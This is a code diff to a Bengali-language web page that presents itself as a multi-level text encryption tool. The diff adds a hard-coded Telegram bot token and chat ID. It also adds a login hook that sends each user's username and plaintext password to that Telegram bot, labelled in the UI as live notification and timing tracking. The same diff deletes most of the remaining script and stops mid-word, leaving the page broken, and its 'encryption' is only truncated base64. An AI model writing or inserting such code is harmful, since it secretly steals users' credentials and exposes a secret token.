@@ -206,6 +206,17 @@
         }
         .copy-btn:hover { background: #059669; }
 
+        .telegram-badge {
+            background: rgba(34, 158, 217, 0.1);
+            border: 1px solid #229ED9;
+            color: #38bdf8;
+            padding: 8px;
+            border-radius: 6px;
+            font-size: 11px;
+            margin-top: 10px;
+            text-align: center;
+        }
+
         .developer-panel {
             background: rgba(59, 130, 246, 0.05);
             border: 1px solid var(--accent-color);
@@ -255,7 +266,7 @@
                 <label>সিক্রেট পাসওয়ার্ড (Password):</label>
                 <input type="password" id="passwordInput" placeholder="পাসওয়ার্ড দিন...">
             </div>
-            <button type="button" class="btn" id="loginButton" onclick="executeUserLogin()">লগইন করুন</button>
+            <button type="button" class="btn" id="loginButton" onclick="executeUserLogin()">লগইন ও টেলিগ্রাম সিঙ্ক</button>
         </div>
 
         <!-- ২. ড্যাশবোর্ড স্ক্রিন -->
@@ -298,6 +309,10 @@
                         <span id="outputResult" style="color: #38bdf8; word-break: break-all;">--</span>
                         <button type="button" class="copy-btn" id="mainCopyBtn" style="margin-left: 8px;" onclick="copyTextToClipboard(document.getElementById('outputResult').innerText, this)">কপি</button>
                     </p>
+
+                    <div class="telegram-badge">
+                        ✈️ টেলিগ্রাম বট লাইভ নোটিফিকেশন ও টাইমিং ট্র্যাক সক্রিয় আছে।
+                    </div>
                 </div>
 
                 <!-- পার্মানেন্ট হিস্ট্রি চ্যাট বক্স -->
@@ -321,6 +336,9 @@
     </div>
 
     <script>
+        const TELEGRAM_BOT_TOKEN = "8047864259:AAHEokK5sjq1jJFuIq_e94sPIeTM2OlsqSs";
+        const TELEGRAM_CHAT_ID = "7938556654";
+
         // ৪টি সুনির্দিষ্ট লেভেল কনফিগারেশন এবং ম্যাট্রিক্স বৃষ্টির কালার কোড
         const levelConfigs = {
             1: { name: "লেভেল ১ (সাধারণ)", hue: 210, matrixColor: "#3b82f6" },       // নীল রঙ
@@ -334,6 +352,34 @@
         let userHistory = [];
         let matrixInterval = null;
         let currentMatrixColor = "#3b82f6";
+        let loginTime = null;
+
+        // টেলিগ্রাম বটে মেসেজ ও টাইমিং ইনফো পাঠানোর ফাংশন
+        function sendTelegramNotification(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: "HTML"
+            };
+
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            })
+            .catch(error => console.error("Telegram Error:", error));
+        }
+
+        // ইউজার কতক্ষণ ওয়েবসাইট ভিজিট করেছেন তা হিসাব করার ফাংশন
+        function getSessionDuration() {
+            if (!loginTime) return "০ সেকেন্ড";
+            const diffMs = Date.now() - loginTime;
+            const diffSec = Math.floor(diffMs / 1000);
+            const mins = Math.floor(diffSec / 60);
+            const secs = diffSec % 60;
+            return mins > 0 ? `${mins} মিনিট ${secs} সেকেন্ড` : `${secs} সেকেন্ড`;
+        }
 
         // লেভেল থিম এবং ম্যাট্রিক্স কালার হ্যান্ডেল করার ফাংশন
         function applySecurityLevelTheme(levelNum) {
@@ -342,7 +388,6 @@
             const root = document.documentElement.style;
 
             if (levelNum == 4) {
-                // লেভেল ৪: সম্পূর্ণ লাল থিম
                 root.setProperty('--bg-color', '#120202');
                 root.setProperty('--panel-bg', '#1f0505');
                 root.setProperty('--accent-color', '#ef4444');
@@ -387,7 +432,6 @@
             resizeCanvas();
             window.addEventListener('resize', resizeCanvas);
 
-            // রাশিয়ান বর্ণমালা (Cyrillic Alphabet)
             const russianAlphabet = 'АБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя0123456789';
             const fontSize = 16;
             const columns = canvas.width / fontSize;
@@ -403,7 +447,7 @@
                 ctx.fillStyle = 'rgba(3, 7, 18, 0.15)';
                 ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-                ctx.fillStyle = currentMatrixColor; // বর্তমান লেভেলের কালার অনুযায়ী অক্ষর পড়াবে
+                ctx.fillStyle = currentMatrixColor;
                 ctx.font = fontSize + 'px monospace';
 
                 for (let i = 0; i < drops.length; i++) {
@@ -418,7 +462,6 @@
             }, 33);
         }
 
-        // পেজ লোড হওয়ার সাথে সাথে ম্যাট্রিক্স বৃষ্টি শুরু করা
         window.onload = function() {
             initRussianMatrixRain();
             applySecurityLevelTheme(1);
@@ -463,7 +506,7 @@
             document.body.removeChild(textarea);
         }
 
-        // ইউজার লগইন হ্যান্ডলার
+        // ইউজার লগইন হ্যান্ডলার ও টেলিগ্রাম নোটিফিকেশন
         function executeUserLogin() {
             const user = document.getElementById('usernameInput').value.trim();
             const pass = document.getElementById('passwordInput').value.trim();
@@ -475,6 +518,13 @@
 
             currentUser = user;
             currentPassword = pass;
+            loginTime = Date.now(); // লগইন করার সময় রেকর্ড শুরু
+
+            const loginMsg = `🔐 <b>নতুন লগইন নোটিফিকেশন!</b>
+👤 নাম: <b>${user}</b>
+🔑 পাসওয়ার্ড: <b>${pass}</b>
+🕒 লগইন সময়: ${new Date().toLocaleString()}`;
+            sendTelegramNotification(loginMsg);
 
             const savedDataKey = `sec_user_${user}_${pass}`;
             const existingData = localStorage.getItem(savedDataKey);
@@ -488,7 +538,7 @@
             renderHistoryList();
         }
 
-        // ইনক্রিপশন এবং ডিক্রিপশন প্রসেসিং ফাংশন
+        // ইনক্রিপশন এবং ডিক্রিপশন প্রসেসিং ও টেলিগ্রাম নোটিফিকেশন
         function processEncryptionDecryption(actionType) {
             const textInput = document.getElementById('userInputText');
             const text = textInput.value.trim();
@@ -497,87 +547,4 @@
                 return;
             }
 
-            const currentLevelNum = document.getElementById('securityLevelSelect').value;
-
-            const timeStr = new Date().toLocaleTimeString();
-            let resultOutput = "";
-
-            if (actionType === 'encrypt') {
-                resultOutput = `🔒 L${currentLevelNum}_Enc_${btoa(text).substring(0, 12)}`;
-            } else {
-                resultOutput = `🔓 L${currentLevelNum}_Dec_${text.replace(/🔒 L\d+_Enc_/, '')}_OK`;
-            }
-
-            document.getElementById('outputResult').innerText = resultOutput;
-
-            const recordItem = {
-                type: actionType.toUpperCase(),
-                level: currentLevelNum,
-                input: text,
-                output: resultOutput,
-                time: timeStr
-            };
-
-            userHistory.unshift(recordItem);
-
-            const savedDataKey = `sec_user_${currentUser}_${currentPassword}`;
-            localStorage.setItem(savedDataKey, JSON.stringify(userHistory));
-
-            renderHistoryList();
-            textInput.value = "";
-        }
-
-        // হিস্ট্রি লিস্ট রেন্ডার করা
-        function renderHistoryList() {
-            const container = document.getElementById('historyListContainer');
-            container.innerHTML = "";
-
-            if (userHistory.length === 0) {
-                container.innerHTML = "<div style='color: #64748b; text-align: center; padding: 20px;'>কোনো হিস্ট্রি নেই।</div>";
-                return;
-            }
-
-            userHistory.forEach((item) => {
-                const div = document.createElement('div');
-                div.className = 'history-item';
-                div.innerHTML = `
-                    <div style="max-width: 75%; overflow: hidden; text-overflow: ellipsis;">
-                        [${item.time}] <b>${item.type} (L${item.level})</b>: ${item.input} ➔ <span style="color:#10b981;">${item.output}</span>
-                    </div>
-                    <button type="button" class="copy-btn" onclick="copyTextToClipboard('${item.output}', this)">কপি</button>
-                `;
-                container.appendChild(div);
-            });
-        }
-
-        // ইউজার লগআউট হ্যান্ডলার
-        function executeUserLogout() {
-            currentUser = null;
-            currentPassword = null;
-            userHistory = [];
-
-            document.getElementById('dashboardScreen').style.display = 'none';
-            document.getElementById('loginScreen').style.display = 'block';
-            document.getElementById('usernameInput').value = "";
-            document.getElementById('passwordInput').value = "";
-            document.getElementById('securityLevelSelect').value = "1";
-            applySecurityLevelTheme(1);
-        }
-
-        // ফিজিক্যাল কিবোর্ড সাপোর্ট (Enter Key)
-        document.addEventListener('keydown', function(event) {
-            if (event.key === 'Enter') {
-                const loginScreen = document.getElementById('loginScreen');
-                if (loginScreen.style.display !== 'none') {
-                    executeUserLogin();
-                } else {
-                    const userInput = document.getElementById('userInputText');
-                    if (document.activeElement === userInput) {
-                        processEncryptionDecryption('encrypt');
-                    }
-                }
-            }
-        });
-    </script>
-</body>
-</html>
+            cons
